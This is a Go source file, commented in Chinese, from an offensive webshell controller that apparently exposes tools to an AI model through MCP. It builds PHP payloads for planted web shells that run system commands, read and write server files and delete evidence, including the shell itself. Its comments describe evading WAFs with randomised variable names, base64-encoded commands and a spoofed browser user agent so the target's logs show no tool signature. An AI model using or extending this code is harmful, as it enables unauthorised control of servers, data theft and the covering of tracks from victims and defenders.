package webshell

// 载荷协议（与 artex-full 的 webshell_mcp.py / server/webshell.go 同源）。
//
// eval 型会话（php / php_raw）的请求-响应约定：
//
//	请求：param=<一段 PHP 代码>
//	响应：<<<tag>b>><base64(输出)><<<tag>e>>
//
// tag 由参数名派生（sha256("m:"+param) 前 3 字节），所以同一个马换个参数名就换
// 一组标记——判断「这条响应到底是不是我这条会话回的」不靠猜。
//
// 为什么不用固定标记/固定变量名：固定 $__artex_xxx 等于把工具名写进每个请求的
// eval 代码，WAF 把 base64 解一层就能认出是谁家的平台。变量名每次随机（26^5
// 的空间），嵌套两段代码各自独立随机。

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"
	"time"
	"unicode/utf8"
)

const (
	// ProxyEnv 是全局默认出口代理（会话里的 proxy 优先）。都为空则直连。
	ProxyEnv = "POJUN_WEBSHELL_PROXY"
	// PayloadDirEnv 指到自备载荷库；为空时用内置模板。
	PayloadDirEnv = "POJUN_WEBSHELL_PAYLOAD_DIR"
	// DefaultUA 用普通浏览器 UA：之前自报 "ARTEX-Webshell-MCP/1.0" 的做法等于在
	// 目标日志里留一枚签名。会话可用 user_agent 覆盖。
	DefaultUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
		"(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

// markerDirt 是常见一句话马自带的回显前后缀（只收不会误伤正常输出的经典标记）。
var markerDirt = []string{"->|", "|<-", "<-|", "|->"}

// markers 按参数名派生一对标记。参数名为空时按 "pass" 算——与默认参数名一致，
// 否则「没填参数名」和「填了 pass」会得到两套标记，同一匹马两种行为。
func markers(sess Session) (string, string) {
	key := strings.TrimSpace(sess.Param)
	if key == "" {
		key = "pass"
	}
	sum := sha256.Sum256([]byte("m:" + key))
	tag := hex.EncodeToString(sum[:3])
	return "<<" + tag + "b>>", "<<" + tag + "e>>"
}

// varRoles 是生成 PHP 代码时各类临时变量的角色字母。
// 键：c=命令 o=输出 p=路径 d=数据 n=数量 s=尺寸 b=缓冲 f=文件句柄 l=列表 r=结果
const varRoles = "copdnsbflvr"

// varNames 每次生成一段 PHP 代码就取一组一次性变量名：$_(5 位随机小写)(角色)。
func varNames() map[string]string {
	suf := randLetters(5)
	out := make(map[string]string, len(varRoles))
	for i := 0; i < len(varRoles); i++ {
		r := varRoles[i : i+1]
		out[r] = "$_" + suf + r
	}
	return out
}

// randLetters 取 n 位随机小写字母（crypto/rand，失败退化为时间派生）。
func randLetters(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		seed := time.Now().UnixNano()
		for i := range buf {
			buf[i] = byte(seed >> (uint(i%8) * 8))
		}
	}
	out := make([]byte, n)
	for i := range buf {
		out[i] = letters[int(buf[i])%len(letters)]
	}
	return string(out)
}

// phpCommandPayload：type=php，base64 传命令 + system() 执行 + ob 捕获 + 标记回传。
//
// 命令先 base64：这样命令里的引号、管道、中文都不会被马的传输层截断，也不容易
// 被 WAF 的关键字规则命中。
func phpCommandPayload(cmd string, sess Session) string {
	b := b64enc([]byte(cmd))
	n := varNames()
	mb, me := markers(sess)
	return fmt.Sprintf("%s=base64_decode('%s');"+
		"ob_start();@system(%s);%s=ob_get_clean();"+
		"echo '%s'.base64_encode(%s).'%s';",
		n["c"], b, n["c"], n["o"], mb, n["o"], me)
}

// phpCodePayload：把 code 当 PHP 代码执行（php_raw 与文件读写的载体）。
func phpCodePayload(code string, sess Session) string {
	c := strings.TrimSpace(code)
	if c == "" {
		return ""
	}
	if !strings.HasSuffix(c, ";") && !strings.HasSuffix(c, "}") {
		c += ";"
	}
	n := varNames()
	mb, me := markers(sess)
	return fmt.Sprintf("ob_start();%s%s=ob_get_clean();"+
		"echo '%s'.base64_encode(%s).'%s';", c, n["o"], mb, n["o"], me)
}

// phpWriteCode：写远端文件（外层再包 phpCodePayload）。回执 "OK:<字节数>"。
func phpWriteCode(remotePath string, data []byte, appendMode bool) string {
	p := b64enc([]byte(remotePath))
	d := b64enc(data)
	mode := "0"
	if appendMode {
		mode = "FILE_APPEND"
	}
	n := varNames()
	return fmt.Sprintf("%s=base64_decode('%s');%s=base64_decode('%s');"+
		"%s=@file_put_contents(%s,%s,%s);"+
		"echo ($%s===false?'ERR':'OK:'.%s);",
		n["p"], p, n["d"], d, n["r"], n["p"], n["d"], mode, n["r"], n["r"])
}

// phpReadCode：读远端文件。回执 "OK|<原始大小>|<base64 内容>"，超出上限就截断
// 并如实报原始大小（调用方据此决定是否分块续读）。
func phpReadCode(remotePath string, maxBytes int) string {
	p := b64enc([]byte(remotePath))
	n := varNames()
	return fmt.Sprintf("%s=base64_decode('%s');"+
		"if(!@is_file(%s)){echo 'ERR:not a file';}else{"+
		"%s=@file_get_contents(%s,false,null,0,%d);"+
		"echo 'OK|'.@filesize(%s).'|'.base64_encode(%s);}",
		n["p"], p, n["p"], n["d"], n["p"], maxBytes, n["p"], n["d"])
}

// selfPathStmt 生成「把 $n[p] 赋成本马自身的绝对路径」的语句。
//
// __FILE__ 在 eval 里会变成 "/var/www/x.php(17) : eval()'d code" 这种伪路径，
// unlink 会静默失败，所以按 SCRIPT_FILENAME → get_included_files()[0] →
// __FILE__ 三级回退，最后统一 realpath。命令型（jsp/aspx）拿不到这个，只能靠
// 登记时填对的 remote_path。
func selfPathStmt(n map[string]string) string {
	p, l := n["p"], n["l"]
	return fmt.Sprintf("%s=isset($_SERVER['SCRIPT_FILENAME'])?$_SERVER['SCRIPT_FILENAME']:'';"+
		"if(%s===''||!@is_file(%s)){%s=@get_included_files();if(!empty(%s)){%s=%s[0];}}"+
		"if(%s===''||!@is_file(%s)){%s=__FILE__;}"+
		"%s=@realpath(%s);",
		p, p, p, l, l, p, l, p, p, p, p, p)
}

// phpSelfPathCode：让马自报「我自己在哪」（清痕迹前先确认路径用）。
func phpSelfPathCode() string {
	n := varNames()
	return selfPathStmt(n) + "echo " + n["p"] + ";"
}

// phpDeleteCode：删一批远端文件并逐个回报。includeSelf 为真时同时尝试自删
// （自删这一条注定拿不到回执，调用方靠「删完再请求一次打不通」确认）。
func phpDeleteCode(paths []string, includeSelf bool) string {
	quoted := make([]string, 0, len(paths))
	for _, p := range paths {
		quoted = append(quoted, "'"+b64enc([]byte(p))+"'")
	}
	n := varNames()
	var b strings.Builder
	b.WriteString(n["l"] + "=array(" + strings.Join(quoted, ",") + ");")
	b.WriteString("foreach(" + n["l"] + " as " + n["f"] + "){")
	b.WriteString(n["p"] + "=@realpath(base64_decode(" + n["f"] + "));")
	b.WriteString("if(" + n["p"] + "===false){" + n["p"] + "=base64_decode(" + n["f"] + ");}")
	b.WriteString(n["r"] + "=@file_exists(" + n["p"] + ")&&@unlink(" + n["p"] + ")?'DEL':'KEEP';")
	b.WriteString("echo " + n["r"] + ".'|'.base64_encode(" + n["p"] + ").\"\\n\";}")
	if includeSelf {
		// 自删这一条注定拿不到回执（进程把自己删了就没法 echo），调用方靠
		// 「删完再请求一次打不通」确认——所以这里不做任何回执承诺。
		b.WriteString(selfPathStmt(n))
		b.WriteString("@unlink(" + n["p"] + ");")
	}
	return b.String()
}

// extractMarked 从响应里取标记之间的 base64 并解码。ok=false 表示「不是这条
// 会话的响应」（WAF 拦截页、静态页、别的马），由调用方决定是报错还是降级。
func extractMarked(text string, sess Session) (string, bool, error) {
	mb, me := markers(sess)
	i := strings.Index(text, mb)
	if i < 0 {
		return "", false, nil
	}
	start := i + len(mb)
	j := strings.Index(text[start:], me)
	if j < 0 {
		return "", false, nil
	}
	blob := text[start : start+j]
	dec, err := b64dec(blob)
	if err != nil {
		return "", false, fmt.Errorf("标记内不是合法 base64（%v）: %s", err, brief(blob, 120))
	}
	return decodeBody(dec), true, nil
}

// cleanPlain 清洗命令型马的回显：去标记杂物、去 NUL、按需解 base64。
func cleanPlain(text string, allowB64 bool) string {
	t := strings.ReplaceAll(text, "\x00", "")
	for _, m := range markerDirt {
		t = strings.ReplaceAll(t, m, "")
	}
	s := strings.TrimSpace(t)
	if allowB64 && len(s) >= 4 && b64LookingRE.MatchString(s) {
		if dec, err := b64dec(s); err == nil && len(dec) > 0 && printable(dec) {
			t = decodeBody(dec)
		}
	}
	return strings.Trim(t, "\r\n")
}

var (
	b64LookingRE = regexp.MustCompile(`^[A-Za-z0-9+/=\s]+$`)
	// 'OK:<字节数>'
	okWriteRE = regexp.MustCompile(`^OK:(\d+)$`)
	// 'OK|<原始大小>|'
	okSizeRE = regexp.MustCompile(`^OK\|(\d+)\|`)
	// 远端把「命令不存在」当回显返回时，用它识别「马类型判断错了」。
	shellErrRE = regexp.MustCompile(`(?i)(?:^|\n)\s*(?:/bin/)?(?:sh|bash|dash|zsh):\s*.*(?:not found|Syntax error)` +
		`|command not found` +
		`|is not recognized as an internal or external command` +
		`|不是内部或外部命令`)
	// WAF / 网关拦截页特征：这类响应绝不能当成命令回显交给模型。
	blockRE = regexp.MustCompile(`(?i)<!doctype\s+html|<html[\s>]|<head[\s>]|request rejected|access denied` +
		`|web application firewall|拦截|禁止访问|非法请求|\b403\b|\b406\b`)
)

func looksBlocked(text string) bool { return blockRE.MatchString(text) }

// b64enc / b64dec 用标准编码但容忍换行与 URL-safe 变体（不同马的回显习惯不同）。
func b64enc(data []byte) string { return base64.StdEncoding.EncodeToString(data) }

func b64dec(text string) ([]byte, error) {
	s := strings.TrimSpace(text)
	s = strings.ReplaceAll(s, "\n", "")
	s = strings.ReplaceAll(s, "\r", "")
	s = strings.ReplaceAll(s, " ", "")
	if dec, err := base64.StdEncoding.DecodeString(s); err == nil {
		return dec, nil
	}
	if dec, err := base64.RawStdEncoding.DecodeString(strings.TrimRight(s, "=")); err == nil {
		return dec, nil
	}
	if dec, err := base64.URLEncoding.DecodeString(s); err == nil {
		return dec, nil
	}
	return nil, fmt.Errorf("base64 解码失败")
}

// decodeBody 把响应字节转成可读文本：先按 UTF-8，失败再尽力转成合法 UTF-8
// （中文 Windows 目标的 cmd 输出常是 GBK，这里不引入编码库，只保证不产生
// 非法串把 JSON 序列化搞坏）。
func decodeBody(raw []byte) string {
	if len(raw) == 0 {
		return ""
	}
	if utf8.Valid(raw) {
		return string(raw)
	}
	return strings.ToValidUTF8(string(raw), "\uFFFD")
}

// printable 判断一段字节是否基本是文本（用于「base64 解出来是文件还是垃圾」）。
func printable(data []byte) bool {
	if len(data) == 0 {
		return false
	}
	bad := 0
	for _, c := range data {
		if c == 0 || (c < 0x09) || (c > 0x0d && c < 0x20) || c == 0x7f {
			bad++
		}
	}
	return bad*10 < len(data) // 坏字节少于 10% 就当文本
}

// brief 截断文本用于错误提示（不把整页 HTML 灌进上下文）。
func brief(text string, limit int) string {
	t := strings.TrimSpace(text)
	if len(t) <= limit {
		return t
	}
	return t[:limit] + "…"
}
